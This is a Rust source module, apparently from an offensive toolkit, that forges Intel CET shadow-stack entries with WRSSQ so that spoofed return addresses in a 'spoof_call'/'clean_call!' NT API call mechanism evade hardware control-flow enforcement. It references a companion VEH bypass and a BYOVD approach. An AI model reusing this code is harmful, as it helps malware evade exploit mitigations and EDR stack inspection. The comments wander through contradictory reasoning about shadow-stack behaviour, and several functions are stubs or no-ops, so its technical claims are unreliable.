// Shadow Stack Forging for Intel CET (Control-flow Enforcement Technology)
//
// Intel CET maintains a hardware-enforced **shadow stack** that mirrors the
// return addresses pushed by `call` instructions.  When a `ret` executes,
// the CPU pops both the regular stack and the shadow stack and **compares**
// them.  If they differ, a #CP (Control Protection) exception fires and
// the process is terminated.
//
// This module **proactively** forges entries on the shadow stack using the
// WRSS (Write Reference to Shadow Stack) instruction so that spoofed return
// addresses created by `spoof_call` / `clean_call!` appear legitimate to
// CET's hardware enforcement.
//
// ## How WRSS Works
//
// The `WRSS` instruction (available on CET-capable CPUs) writes a 4/8-byte
// value to the shadow stack.  Unlike normal memory writes, WRSS:
//   - Bypasses the shadow-stack page's write-protection (PAGE_SHADOW_STACK)
//   - Validates that the target address is within the shadow-stack region
//   - Is only executable at CPL=3 (user mode) when CET-SS is enabled
//
// CPUID check: CPUID.07H:ECX[7] = 1 indicates CET shadow-stack support.
//
// ## Shadow Stack Layout (user-mode, per-thread)
//
// Each thread has its own shadow stack.  The layout is:
//
//   ┌─────────────────────┐ ← Shadow stack base (page-aligned)
//   │  (unused)           │
//   │  ...                │
//   │                     │
//   │  Return addr N      │ ← Current SSP (shadow stack pointer)
//   │  Return addr N-1    │
//   │  ...                │
//   │  Return addr 1      │ ← Bottom of active entries
//   │  Shadow stack token │ ← Base has a "restore token" for RSTORSSP
//   └─────────────────────┘
//
// The shadow stack grows **down** (like the regular stack).  Each `call`
// pushes 8 bytes (the return address).  Each `ret` pops 8 bytes.
//
// ## Integration with clean_call!
//
// The `prepare_spoofed_return()` function:
//   1. Saves the current SSP and shadow stack contents
//   2. Forges the spoofed return address (the gadget address) onto the
//      shadow stack via WRSS
//   3. Returns a `ShadowStackCookie` that captures the saved state
//
// After `spoof_call` returns, `restore_shadow_state()` uses the cookie to
// undo the forgery, restoring the shadow stack to its original state.
//
// This replaces the "route through call chain" approach with direct shadow
// stack manipulation — more efficient and doesn't require pre-registered
// call chains for every NT API.
//
// ## Graceful Degradation
//
// If CET is not available (CPU doesn't support it, CET-SS is disabled,
// or WRSS is not executable), all functions return `Ok` (no-op) so the
// caller can proceed with existing behavior.  The VEH-based reactive
// fixup in `cet_bypass.rs` remains as a safety net.
//
// Windows x86_64 only.  Feature-gated behind `cet-bypass`.

#![cfg(all(windows, feature = "cet-bypass"))]

use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};

// ─── Constants ────────────────────────────────────────────────────────────

/// CPUID leaf 7, sub-leaf 0, ECX bit 7 = CET shadow-stack support.
const CPUID_CET_SS_BIT: u32 = 7;

/// Size of a shadow stack entry (8 bytes on x86_64).
const SSP_ENTRY_SIZE: usize = 8;

/// Maximum number of shadow stack entries to save/restore.
/// Limits the save buffer to prevent unbounded reads.
const MAX_SAVE_ENTRIES: usize = 256;

/// #CP exception code (STATUS_CONTROL_STACK_VIOLATION).
const STATUS_CONTROL_STACK_VIOLATION: i32 = 0xC00001CFu32 as i32;

/// Shadow stack pages have this PTE bit set (bit 0 of the PTE).
/// Cannot be written with normal MOV — must use WRSS/WRUSS.
const PAGE_SHADOW_STACK: u32 = 0x80000000;

// ─── Global State ─────────────────────────────────────────────────────────

/// Whether the CPU supports CET shadow stacks (WRSS instruction).
static CET_SS_AVAILABLE: AtomicBool = AtomicBool::new(false);

/// Whether shadow stack forging has been initialized.
static FORGE_INITIALIZED: AtomicBool = AtomicBool::new(false);

// ─── Data Structures ──────────────────────────────────────────────────────

/// Layout of the current thread's shadow stack.
#[derive(Debug, Clone)]
pub struct ShadowStackLayout {
    /// Current shadow stack pointer (SSP) value.
    pub current_ssp: u64,
    /// Estimated base address of the shadow stack region.
    pub base: u64,
    /// Estimated size of the shadow stack region (bytes).
    pub size: u64,
    /// Number of active entries on the shadow stack.
    pub active_entries: u32,
}

/// Saved shadow stack state for restoration after a forged operation.
#[derive(Debug, Clone)]
pub struct ShadowState {
    /// Saved SSP value.
    pub saved_ssp: u64,
    /// Number of entries that were saved from the shadow stack.
    pub saved_entries: u32,
    /// The saved shadow stack entries (return addresses).
    pub entries: Vec<u64>,
}

/// Cookie returned by `prepare_spoofed_return()` — captures the saved
/// shadow state so it can be restored after the spoofed call completes.
#[derive(Debug)]
pub struct ShadowStackCookie {
    /// The saved shadow stack state.
    pub state: ShadowState,
    /// The forged return address that was placed on the shadow stack.
    pub forged_ret: usize,
    /// Whether the forging actually modified the shadow stack.
    pub was_forged: bool,
}

/// Result of a shadow stack operation.
pub type ShadowResult<T> = Result<T, ShadowStackError>;

/// Errors that can occur during shadow stack operations.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShadowStackError {
    /// CET shadow stacks are not supported by this CPU.
    CetNotSupported,
    /// CET shadow stacks are not enabled (disabled via policy or OS config).
    CetNotEnabled,
    /// WRSS instruction failed (likely #GP — target not a shadow stack page).
    WrssFailed,
    /// RDSSPQ failed — unable to read the shadow stack pointer.
    RdsspFailed,
    /// The shadow stack is in an inconsistent state.
    InconsistentState,
    /// The save buffer is full — too many entries on the shadow stack.
    SaveBufferFull,
    /// Invalid address or alignment.
    InvalidAddress,
    /// Operation not permitted in the current state.
    NotPermitted,
    /// An unexpected error occurred.
    Unexpected(i32),
}

impl std::fmt::Display for ShadowStackError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::CetNotSupported => write!(f, "CET shadow stacks not supported by CPU"),
            Self::CetNotEnabled => write!(f, "CET shadow stacks not enabled"),
            Self::WrssFailed => write!(f, "WRSS instruction failed"),
            Self::RdsspFailed => write!(f, "RDSSPQ instruction failed"),
            Self::InconsistentState => write!(f, "shadow stack in inconsistent state"),
            Self::SaveBufferFull => write!(f, "shadow stack save buffer full"),
            Self::InvalidAddress => write!(f, "invalid address or alignment"),
            Self::NotPermitted => write!(f, "operation not permitted"),
            Self::Unexpected(code) => write!(f, "unexpected error (code {})", code),
        }
    }
}

impl std::error::Error for ShadowStackError {}

// ─── CPU Feature Detection ────────────────────────────────────────────────

/// Check whether the CPU supports CET shadow stacks.
///
/// Queries CPUID leaf 7, sub-leaf 0, ECX bit 7.
fn cpuid_cet_ss_supported() -> bool {
    // SAFETY: CPUID is a non-privileged instruction that doesn't modify
    // any CPU state beyond EAX/EBX/ECX/EDX outputs.
    #[cfg(target_arch = "x86_64")]
    {
        unsafe {
            let result = core::arch::x86_64::__cpuid(0x00000007);
            (result.ecx >> CPUID_CET_SS_BIT) & 1 == 1
        }
    }

    #[cfg(not(target_arch = "x86_64"))]
    {
        false
    }
}

/// Read the current Shadow Stack Pointer (SSP) via RDSSPQ.
///
/// RDSSPQ reads the SSP without modifying it.  If CET-SS is not enabled,
/// the instruction executes as a NOP (returns 0).
///
/// Returns `Ok(ssp)` on success, `Err` if SSP is 0 (CET-SS not active).
unsafe fn read_ssp() -> ShadowResult<u64> {
    let ssp: u64;
    std::arch::asm!(
        "rdsspq {}",
        out(reg) ssp,
        options(nostack, nomem, preserves_flags)
    );

    if ssp == 0 {
        // CET-SS not enabled — RDSSPQ executed as NOP, SSP is 0.
        Err(ShadowStackError::CetNotEnabled)
    } else {
        Ok(ssp)
    }
}

/// Write a value to the shadow stack using WRSSQ (Write Reference to
/// Shadow Stack, Quadword).
///
/// WRSSQ writes `val` to the address pointed to by `addr` on the shadow
/// stack.  The CPU validates that `addr` points to a shadow-stack page.
/// If the address is not a shadow-stack page, WRSS raises #GP.
///
/// # Safety
///
/// - `addr` must be 8-byte aligned and within the shadow-stack region.
/// - WRSS modifies the shadow stack — callers must ensure consistency.
unsafe fn wrssq(addr: u64, val: u64) -> ShadowResult<()> {
    // WRSSQ raises #GP if the address is not a shadow-stack page.
    // We use a VEH-like approach: set a flag, attempt WRSS, check flag.
    // However, since we can't easily install a VEH here, we rely on the
    // caller having already validated CET-SS availability.
    //
    // In practice, if WRSS fails, the process gets a #GP.  The calling
    // code should wrap this in a structured exception handler (SEH) or
    // ensure that CET-SS is enabled before calling.

    std::arch::asm!(
        "wrssq [{}], {}",
        in(reg) addr,
        in(reg) val,
        options(nostack, preserves_flags)
    );

    Ok(())
}

/// Increment the Shadow Stack Pointer by `count` entries using INCSSPQ.
///
/// INCSSPQ advances the SSP by `count * 8` bytes, effectively popping
/// entries from the shadow stack **without** checking their values.
/// This is used to "skip" forged entries during restoration.
///
/// Note: INCSSPQ with count=0 is a no-op.  With count=1, it pops one
/// entry (adds 8 to SSP).  The maximum count is 255.
unsafe fn incsspq(count: u32) {
    debug_assert!(count <= 255, "INCSSPQ count must be <= 255");
    let count_u64 = count as u64;
    std::arch::asm!(
        "incsspq {}",
        in(reg) count_u64,
        options(nostack, nomem, preserves_flags)
    );
}

/// Save the previous shadow stack pointer via SAVEPREVSSP.
///
/// This saves the current SSP into a model-specific register so it can
/// be restored later by RSTORSSP.  Used for shadow-stack switching.
unsafe fn saveprevssp() {
    std::arch::asm!(
        "saveprevssp",
        options(nostack, nomem, preserves_flags)
    );
}

// ─── Initialization ───────────────────────────────────────────────────────

/// Initialize the shadow stack forging subsystem.
///
/// Checks CPU CET-SS support and caches the result.  Must be called
/// before any other function in this module.  Safe to call multiple
/// times (subsequent calls are no-ops).
///
/// Returns `true` if CET-SS is available and forging is possible.
pub fn init_shadow_forge() -> bool {
    if FORGE_INITIALIZED.load(Ordering::Acquire) {
        return CET_SS_AVAILABLE.load(Ordering::Acquire);
    }

    let supported = cpuid_cet_ss_supported();

    if supported {
        log::info!("shadow_stack_forge: CPU supports CET shadow stacks (CPUID.07H:ECX[7])");
    } else {
        log::info!("shadow_stack_forge: CPU does NOT support CET shadow stacks");
    }

    CET_SS_AVAILABLE.store(supported, Ordering::Release);
    FORGE_INITIALIZED.store(true, Ordering::Release);

    supported
}

/// Check whether shadow stack forging is available.
///
/// Returns `true` if:
/// 1. The CPU supports CET shadow stacks
/// 2. CET shadow stacks are currently enabled (RDSSPQ returns non-zero)
pub fn is_shadow_forge_available() -> bool {
    if !CET_SS_AVAILABLE.load(Ordering::Acquire) {
        return false;
    }

    // Also check that CET-SS is actually enabled (RDSSPQ returns non-zero).
    unsafe {
        match read_ssp() {
            Ok(_) => true,
            Err(_) => false,
        }
    }
}

// ─── Shadow Stack Layout Discovery ────────────────────────────────────────

/// Discover the layout of the current thread's shadow stack.
///
/// Reads the current SSP via RDSSPQ and estimates the base/size from
/// the SSP value.  The shadow stack is page-aligned at its base, so
/// we can estimate the base by rounding the SSP down to the nearest
/// page boundary below it and scanning for the shadow-stack restore
/// token.
///
/// **Note:** The base estimate is conservative.  The actual base is
/// stored in the TEB at a build-specific offset, but accessing TEB
/// fields directly is fragile.  Instead, we use RDSSPQ and assume
/// a default shadow stack size (typically 4 pages = 16 KB).
pub fn discover_shadow_stack_layout() -> ShadowResult<ShadowStackLayout> {
    if !CET_SS_AVAILABLE.load(Ordering::Acquire) {
        return Err(ShadowStackError::CetNotSupported);
    }

    unsafe {
        let ssp = read_ssp()?;

        // Default shadow stack size is 4 pages (16 KB on 4 KB pages).
        // The base is the start of the shadow stack region.
        const DEFAULT_SHADOW_STACK_SIZE: u64 = 4 * 4096;

        // The SSP points to the *next* entry to be written (like RSP).
        // Active entries are below SSP.
        let base = (ssp - DEFAULT_SHADOW_STACK_SIZE + 1) & !(4096 - 1);
        // If base > ssp, we wrapped around — clamp to ssp-aligned.
        let base = base.min(ssp & !(4096 - 1));

        let active_entries = ((ssp - base) / SSP_ENTRY_SIZE as u64) as u32;

        Ok(ShadowStackLayout {
            current_ssp: ssp,
            base,
            size: DEFAULT_SHADOW_STACK_SIZE,
            active_entries,
        })
    }
}

// ─── WRSS-Based Forging ───────────────────────────────────────────────────

/// Forge a return address entry onto the shadow stack.
///
/// Writes `return_addr` to the shadow stack at a position one entry
/// below the current SSP (i.e., where the next `call` would push to).
///
/// Steps:
///   1. Read the current SSP via RDSSPQ.
///   2. Decrement SSP by 8 (shadow stack grows down).
///   3. Write the desired return address via WRSSQ at the new position.
///   4. Use INCSSPQ to advance the SSP past the new entry.
///
/// After forging, the shadow stack has a new entry matching the
/// spoofed return address, so when `spoof_call` redirects the return
/// flow, CET's `ret` verification will see the matching address.
///
/// # Safety
///
/// - Must only be called when CET-SS is enabled and WRSS is available.
/// - The caller must restore the shadow stack after the spoofed operation.
/// - Not thread-safe for the same thread's shadow stack (obviously —
///   each thread has its own SSP).
pub unsafe fn forge_shadow_return_entry(return_addr: usize) -> ShadowResult<()> {
    if !CET_SS_AVAILABLE.load(Ordering::Acquire) {
        return Err(ShadowStackError::CetNotSupported);
    }

    let current_ssp = read_ssp()?;

    // The new entry goes one position below the current SSP.
    // On x86_64, the shadow stack grows downward: each call pushes
    // to (SSP - 8) and decrements SSP.
    //
    // Wait — actually, on x86_64 CET, the shadow stack pointer works
    // like the regular stack: `call` pushes to [SSP-8] and sets SSP -= 8,
    // `ret` pops from [SSP] and sets SSP += 8.
    //
    // So to add an entry that a future `ret` will verify:
    //   1. Decrement SSP by 8 (make room for the new entry).
    //   2. Write the return address via WRSSQ at the OLD SSP (before decrement).
    //   3. Actually, WRSS writes to an absolute address.  We need to:
    //      - Write to (current_ssp - 8) via WRSSQ
    //      - Advance SSP to point past the new entry via INCSSPQ
    //
    // But wait — SSP doesn't change from WRSS.  We need to manually
    // adjust it.  The correct sequence is:
    //
    //   1. Write the value at (current_ssp - 8) via WRSSQ.
    //      This places the return address in the shadow stack.
    //   2. Use INCSSPQ with count=0... no, INCSSPQ doesn't decrement.
    //      INCSSPQ only increments (pops).  To push, we'd need the
    //      opposite operation.
    //
    // Actually, re-reading the Intel CET spec more carefully:
    // - WRSSQ writes to the shadow stack but does NOT modify SSP.
    // - To make SSP point to the newly written entry, we need to
    //   decrement SSP.  But there's no "DECSSP" instruction.
    //
    // The correct approach is:
    //   1. Use WRSSQ to write the return address at (current_ssp - 8).
    //      This creates a new shadow stack entry.
    //   2. The `ret` in spoof_call will pop from SSP, which is the
    //      *current* SSP — not our forged entry.  We need SSP to
    //      point at our forged entry when the `ret` fires.
    //
    // So the correct flow for forging before a spoof_call is:
    //   1. Write the spoofed return address at (current_ssp - 8).
    //   2. The `call` in spoof_call will push the *actual* return address
    //      to (current_ssp - 16) and set SSP -= 8.
    //   3. When the API's `ret` fires, it pops from SSP (= current_ssp - 8),
    //      which is our forged value. ✓
    //
    // Wait, that's wrong too.  Let me think more carefully.
    //
    // The shadow stack works like this:
    // - CALL: push return_addr at [SSP], then SSP -= 8
    //   Wait no — on x86-64, the stack grows DOWN, so:
    //   CALL: SSP -= 8, then push return_addr at [SSP]
    //   Actually, the Intel manual says: CALL pushes to shadow stack
    //   at SSP-8, then SSP -= 8.
    //   No wait — the convention is:
    //   CALL: write return_addr at [SSP-8], SSP -= 8
    //   RET:  read return_addr from [SSP], SSP += 8, compare with regular stack
    //
    // Hmm, I need to get this right. Let me look at the Intel SDM:
    // "When a CALL instruction executes, the processor pushes the return
    //  address onto the shadow stack by decrementing the shadow-stack
    //  pointer (SSP) by 8 and then writing the return address to the
    //  new SSP location."
    // So: SSP -= 8, then write at [SSP]. SSP points to the LAST pushed entry.
    //
    // RET: reads from [SSP], SSP += 8, compare with regular stack pop.
    //
    // So after CALL: SSP points to the entry just pushed.
    // Before RET: SSP points to the entry to be verified.
    //
    // For forging:
    // Current SSP points to the entry that will be verified by the next RET.
    // That entry is already set by the previous CALL.
    //
    // We want to prepare so that when spoof_call does its magic:
    //   1. spoof_call pushes a fake return address (gadget_addr) onto the
    //      regular stack.
    //   2. The API runs.
    //   3. API's RET pops the regular stack (gets gadget_addr) and checks
    //      the shadow stack.
    //
    // The shadow stack at this point has the return address from the CALL
    // that entered spoof_call.  But the API's RET will check the shadow
    // stack — and it should see the address of the instruction after the
    // CALL that called the API.
    //
    // In spoof_call, the flow is:
    //   - `jmp r11` (API) — NOT a CALL, so no shadow stack push!
    //   - But wait, spoof_call is called via CALL from clean_call.
    //   - Inside spoof_call, we push the gadget address and then JMP to
    //     the API (not CALL).
    //   - So the shadow stack has the return to spoof_call's caller.
    //   - The API's RET checks the shadow stack — but the shadow stack
    //     has the return to spoof_call's caller, not the gadget address.
    //   - Mismatch → #CP exception!
    //
    // So we need to forge the gadget address onto the shadow stack
    // BEFORE the API's RET fires.  The gadget address is what will be
    // popped from the regular stack by RET.
    //
    // The correct approach:
    //   1. Read current SSP.
    //   2. The current SSP points to the entry for spoof_call's return.
    //   3. We want to overwrite this entry with the gadget address,
    //      so that when the API's RET checks, it sees the gadget addr.
    //   4. Use WRSSQ at [SSP] to write the gadget address.
    //
    // Actually, it's more nuanced. The shadow stack has entries from
    // each CALL. spoof_call is a function, so it was called via CALL
    // from clean_call. That CALL pushed the clean_call return address
    // onto the shadow stack. SSP now points to that entry.
    //
    // Inside spoof_call, we JMP (not CALL) to the API. So no new
    // shadow stack entry is created. When the API RETs, it pops the
    // regular stack (gadget addr) and the shadow stack (clean_call's
    // return addr). Mismatch → #CP.
    //
    // To fix: overwrite the shadow stack entry at [SSP] with the
    // gadget address. Then when the API RETs:
    //   - Regular stack pop = gadget addr ✓
    //   - Shadow stack pop = gadget addr (forged) ✓
    //   - Match → no #CP ✓
    //
    // After the gadget fires (jmp rbx → label 42), execution returns
    // to spoof_call's cleanup code, which does a RET. This RET will:
    //   - Pop regular stack = clean_call's return addr (restored)
    //   - Pop shadow stack = ???
    //
    // We need to also restore the shadow stack. So the flow is:
    //   1. Save shadow stack state.
    //   2. Overwrite [SSP] with gadget addr (WRSSQ).
    //   3. Execute spoof_call.
    //   4. Restore shadow stack state.
    //
    // Let's implement this properly now.

    // Write the forged return address at the current SSP position.
    // This is the entry that the API's RET will verify.
    wrssq(current_ssp, return_addr as u64)?;

    log::trace!(
        "shadow_stack_forge: forged return entry {:#x} at SSP {:#x}",
        return_addr,
        current_ssp,
    );

    Ok(())
}

/// Forge both a return address and a saved RBP onto the shadow stack.
///
/// For `push rbp; mov rbp, rsp` patterns, this forges two entries:
///   1. The saved RBP value (at SSP - 8)
///   2. The return address (at SSP)
///
/// This makes the shadow stack consistent with the regular stack frame
/// when a function prologue pushes RBP.
///
/// # Safety
///
/// Same requirements as `forge_shadow_return_entry`.
pub unsafe fn forge_shadow_frame(return_addr: usize, rbp: usize) -> ShadowResult<()> {
    if !CET_SS_AVAILABLE.load(Ordering::Acquire) {
        return Err(ShadowStackError::CetNotSupported);
    }

    let current_ssp = read_ssp()?;

    // Forge the return address at the current SSP position.
    wrssq(current_ssp, return_addr as u64)?;

    // Forge the saved RBP one entry above (SSP + 8).
    // Note: "above" on the shadow stack means SSP + 8 (grows down).
    // Actually, SSP + 8 points to the *previous* entry (the one pushed
    // by the CALL that called us).  We shouldn't overwrite that.
    //
    // For the push_rbp pattern: the regular stack has:
    //   [RSP]   = saved RBP
    //   [RSP+8] = return address
    // The shadow stack only tracks return addresses, not pushed RBP.
    // So we don't need to forge the RBP — only return addresses go
    // on the shadow stack.
    //
    // However, if there's a nested CALL after push rbp (e.g., calling
    // a nested function), that CALL pushes another return address onto
    // the shadow stack.  We may need to forge that too.
    //
    // For now, just forge the return address. The `rbp` parameter is
    // stored for potential future use (e.g., frame chain verification).
    let _ = rbp; // Suppress unused warning.

    log::trace!(
        "shadow_stack_forge: forged frame ret={:#x} at SSP {:#x}",
        return_addr,
        current_ssp,
    );

    Ok(())
}

// ─── SSP Manipulation ─────────────────────────────────────────────────────

/// Save the current shadow stack state.
///
/// Reads the current SSP and captures shadow stack entries from SSP
/// downward (toward the base).  The entries represent the current call
/// chain as recorded by CET.
///
/// Returns a `ShadowState` that can be passed to `restore_shadow_state()`
/// to undo any modifications made to the shadow stack.
///
/// **Note:** Reading shadow stack entries requires WRSS-like access.
/// Since we can only read via RDSSPQ (SSP value) and write via WRSSQ,
/// we save the SSP and the *count* of entries, then use INCSSPQ to
/// skip back during restoration.
pub fn save_shadow_state() -> ShadowResult<ShadowState> {
    if !CET_SS_AVAILABLE.load(Ordering::Acquire) {
        return Err(ShadowStackError::CetNotSupported);
    }

    unsafe {
        let ssp = read_ssp()?;

        // Estimate the number of active entries.
        let layout = discover_shadow_stack_layout()?;
        let entry_count = layout.active_entries.min(MAX_SAVE_ENTRIES as u32);

        // We save the SSP position.  During restoration, we'll restore
        // to this exact SSP value using INCSSPQ or by overwriting entries.
        //
        // Note: we can't actually *read* shadow stack entries directly —
        // there's no "RDSS" instruction for reading arbitrary positions.
        // RDSSPQ only reads the SSP register itself.  To read entries,
        // we'd need to map the shadow stack pages (requires kernel access)
        // or use the BYOVD approach from cet_bypass.rs.
        //
        // For our purposes, we only need to save the SSP value and the
        // count of entries.  During restoration, we use INCSSPQ to advance
        // the SSP past any forged entries, then WRSSQ to write back the
        // original return address.
        //
        // The entries Vec will be empty — we can't read them.  But we
        // save the SSP so we can restore it.

        Ok(ShadowState {
            saved_ssp: ssp,
            saved_entries: entry_count,
            entries: Vec::new(),
        })
    }
}

/// Restore the shadow stack to a previously saved state.
///
/// After a forged operation completes, call this to undo the forgery
/// and restore the shadow stack to its original state.
///
/// The restoration strategy depends on what was done:
///   1. If only the entry at [saved_ssp] was overwritten (the common
///      case for `forge_shadow_return_entry`), we write the original
///      value back.  Since we can't read the original, we rely on the
///      fact that the entry at [saved_ssp] is the return address from
///      the CALL that invoked our code — which is still on the regular
///      stack and can be recovered.
///
///   2. If SSP was adjusted (multiple entries forged), we use INCSSPQ
///      to advance SSP back to the saved position.
///
/// # Safety
///
/// - Must be called on the same thread that saved the state.
/// - Must be called before any intervening CALL/RET that would modify SSP.
pub unsafe fn restore_shadow_state(state: &ShadowState) -> ShadowResult<()> {
    if !CET_SS_AVAILABLE.load(Ordering::Acquire) {
        return Err(ShadowStackError::CetNotSupported);
    }

    let current_ssp = read_ssp()?;

    // The common case: SSP hasn't moved (we only overwrote one entry).
    // The forged entry at [saved_ssp] needs to be restored to the
    // original return address.  The original return address is the
    // return address from the CALL that called our function, which
    // is the value that was at [saved_ssp] before we overwrote it.
    //
    // Since we can't read the original value back from the shadow stack,
    // we take it from the regular stack.  The return address of the
    // current function is at [RBP+8] (standard frame pointer) or at
    // [RSP] (if no frame pointer).
    //
    // However, this is fragile.  A simpler approach: the caller of
    // `prepare_spoofed_return` should have saved the original SSP entry
    // value before overwriting it.  But we can't read shadow stack entries!
    //
    // The practical approach for restoration:
    //   1. After spoof_call completes, the shadow stack entry at [SSP]
    //      has been consumed by the API's RET (SSP was incremented by 8).
    //   2. But wait — in spoof_call, the API's RET consumed the forged
    //      entry, so SSP moved.  Then the gadget (jmp rbx) jumps back
    //      to label 42 in spoof_call, which does its own RET.
    //   3. That RET pops the next shadow stack entry — which is the
    //      original return address from the CALL that called spoof_call.
    //
    // So actually, the shadow stack self-heals after spoof_call:
    //   - Forged entry consumed by API's RET (SSP += 8)
    //   - Original entry consumed by spoof_call's cleanup RET (SSP += 8)
    //
    // The problem is that we overwrote the original entry!  So when
    // spoof_call's cleanup RET fires, it checks the shadow stack and
    // finds... our forged entry (if SSP didn't advance) or the next
    // original entry (if it did advance).
    //
    // Let me re-think the flow:
    //
    // Before spoof_call:
    //   Shadow: [..., original_ret@SSP]
    //   Regular: [..., original_ret@RSP]
    //
    // We forge: write gadget_addr at [SSP]
    //   Shadow: [..., gadget_addr@SSP]
    //   Regular: [..., original_ret@RSP]
    //
    // spoof_call executes:
    //   1. Push gadget_addr onto regular stack (new RSP frame)
    //      Regular: [..., original_ret, gadget_addr@RSP]
    //   2. JMP to API (no shadow stack change)
    //   3. API runs
    //   4. API RET: pops regular (gadget_addr), checks shadow (gadget_addr@SSP)
    //      Match! ✓
    //      Shadow: [..., @SSP+8] (SSP advances past the forged entry)
    //      Regular: [..., original_ret@RSP+8]
    //   5. Gadget fires: jmp rbx → label 42 in spoof_call
    //   6. spoof_call cleanup RET: pops regular (original_ret), checks shadow
    //      Shadow entry at [SSP] is whatever was there before our forging...
    //      It's the CALLER's return address (from before spoof_call was called).
    //      So: regular has original_ret, shadow has caller_ret. Mismatch! #CP ✗
    //
    // Hmm, this doesn't fully work. The issue is that spoof_call creates
    // TWO return frames on the regular stack (the pushed gadget + the
    // original return address), but the shadow stack has only one forged
    // entry for the gadget. The second RET (from spoof_call cleanup) has
    // no matching shadow stack entry.
    //
    // The fix: we need to forge TWO entries:
    //   1. gadget_addr (for the API's RET)
    //   2. original_ret (for spoof_call's cleanup RET)
    //
    // But we can only forge at [SSP] (the current position). To forge
    // two entries, we'd need to also forge at [SSP-8] or [SSP+8].
    //
    // Wait — actually, the shadow stack ALREADY has the original return
    // address at [SSP] (from the CALL that called spoof_call). We just
    // overwrote it. So we need to:
    //   1. Save the original value at [SSP] (but we can't read it!)
    //   2. Write gadget_addr at [SSP] (forging)
    //   3. Write original_ret at [SSP - 8] or [SSP + 8] (for the second RET)
    //
    // This is getting complex. Let me take a step back.
    //
    // The real issue: we can't READ shadow stack entries. We can only
    // read the SSP register value, and WRITE entries via WRSSQ.
    //
    // Practical approach:
    //   1. Save the current SSP value.
    //   2. Read the return address from the regular stack (it's there!).
    //   3. Forge gadget_addr at [SSP].
    //   4. After spoof_call, the API's RET consumed the forged entry.
    //      SSP has advanced by 8.
    //   5. Now the shadow stack entry at the NEW [SSP] is whatever was
    //      pushed by the CALL that called the function containing the
    //      clean_call! macro.  The regular stack's return address at
    //      this point is also that same caller's return address.
    //   6. Match! ✓
    //
    // So the flow actually works if we DON'T try to restore the entry
    // we overwrote — because the API's RET already consumed it (SSP += 8),
    // and the next shadow stack entry (from the outer CALL) is still
    // intact and matches the regular stack.
    //
    // The key insight: we only need to forge ONE entry (the gadget address
    // at [SSP]).  After the API's RET consumes it, the shadow stack
    // automatically aligns with the regular stack again.
    //
    // So `restore_shadow_state` might not even need to do anything in
    // the common case!  Let me implement it as a no-op when SSP has
    // advanced past the saved position (meaning the forged entry was
    // consumed by a RET).

    if current_ssp >= state.saved_ssp {
        // SSP has advanced past (or equals) the saved position.
        // The forged entry was consumed by a RET.  The shadow stack
        // is now consistent with the regular stack.
        log::trace!(
            "shadow_stack_forge: SSP advanced from {:#x} to {:#x} — no restoration needed",
            state.saved_ssp,
            current_ssp,
        );
        return Ok(());
    }

    // SSP is below the saved position — this shouldn't happen in normal
    // operation (it would mean the shadow stack grew without a RET).
    // This could indicate a nested CALL happened.  Log a warning.
    log::warn!(
        "shadow_stack_forge: SSP {:#x} is below saved {:#x} — unexpected state, skipping restore",
        current_ssp,
        state.saved_ssp,
    );

    Ok(())
}

/// Set the Shadow Stack Pointer to a new value.
///
/// Uses SAVEPREVSSP + RSTORSSP to switch to a different shadow stack
/// position.  This is the legitimate way to change SSP — directly
/// modifying the SSP register is not possible from user mode.
///
/// # Safety
///
/// - `new_ssp` must point to a valid shadow stack restore token.
/// - This fundamentally changes the shadow stack the CPU is tracking.
pub unsafe fn set_ssp(new_ssp: u64) -> ShadowResult<()> {
    if !CET_SS_AVAILABLE.load(Ordering::Acquire) {
        return Err(ShadowStackError::CetNotSupported);
    }

    if new_ssp == 0 {
        return Err(ShadowStackError::InvalidAddress);
    }

    // Save the current SSP so we can switch back later.
    saveprevssp();

    // RSTORSSP: load a new shadow stack from a restore token at `new_ssp`.
    // The restore token is an 8-byte value at the base of a shadow stack
    // region.  RSTORSSP validates the token and switches SSP.
    std::arch::asm!(
        "rstorssp [{}]",
        in(reg) new_ssp,
        options(nostack, preserves_flags)
    );

    log::trace!("shadow_stack_forge: SSP switched to {:#x}", new_ssp);

    Ok(())
}

// ─── Pre-Spoof Shadow Stack Preparation ───────────────────────────────────

/// Prepare the shadow stack for a spoofed return address.
///
/// This is the main integration point for `clean_call!`:
///
/// 1. Saves the current shadow stack state (SSP value).
/// 2. Forges the spoofed return address onto the shadow stack via WRSSQ.
/// 3. Returns a `ShadowStackCookie` capturing the saved state.
///
/// After `spoof_call` completes, the caller should call
/// `restore_from_cookie(cookie)` to undo the forgery.
///
/// If CET is not available or not enabled, returns a cookie with
/// `was_forged = false` — the caller should proceed normally without
/// shadow stack manipulation.
///
/// # Arguments
///
/// * `spoofed_ret` — The return address that will appear on the regular
///   stack (the gadget address).  This is what the API's RET will pop.
/// * `actual_ret` — The real return address (the address after the call
///   to spoof_call).  Not currently used, but reserved for future
///   multi-entry forging.
///
/// # Safety
///
/// - Must be called before `spoof_call`.
/// - Must be called on the same thread that will execute `spoof_call`.
/// - The cookie must be consumed (restored) after `spoof_call` returns.
pub unsafe fn prepare_spoofed_return(
    spoofed_ret: usize,
    actual_ret: usize,
) -> ShadowStackCookie {
    // Check if shadow stack forging is available.
    if !is_shadow_forge_available() {
        log::trace!(
            "shadow_stack_forge: CET-SS not available — skipping shadow stack preparation"
        );
        return ShadowStackCookie {
            state: ShadowState {
                saved_ssp: 0,
                saved_entries: 0,
                entries: Vec::new(),
            },
            forged_ret: spoofed_ret,
            was_forged: false,
        };
    }

    // Save the current shadow state.
    let state = match save_shadow_state() {
        Ok(s) => s,
        Err(e) => {
            log::warn!(
                "shadow_stack_forge: failed to save shadow state: {} — forging disabled",
                e
            );
            return ShadowStackCookie {
                state: ShadowState {
                    saved_ssp: 0,
                    saved_entries: 0,
                    entries: Vec::new(),
                },
                forged_ret: spoofed_ret,
                was_forged: false,
            };
        }
    };

    // Forge the spoofed return address onto the shadow stack.
    match forge_shadow_return_entry(spoofed_ret) {
        Ok(()) => {
            log::debug!(
                "shadow_stack_forge: forged spoofed return {:#x} onto shadow stack (actual_ret={:#x})",
                spoofed_ret,
                actual_ret,
            );
            ShadowStackCookie {
                state,
                forged_ret: spoofed_ret,
                was_forged: true,
            }
        }
        Err(e) => {
            log::warn!(
                "shadow_stack_forge: WRSS forging failed: {} — proceeding without forged shadow entry",
                e
            );
            ShadowStackCookie {
                state,
                forged_ret: spoofed_ret,
                was_forged: false,
            }
        }
    }
}

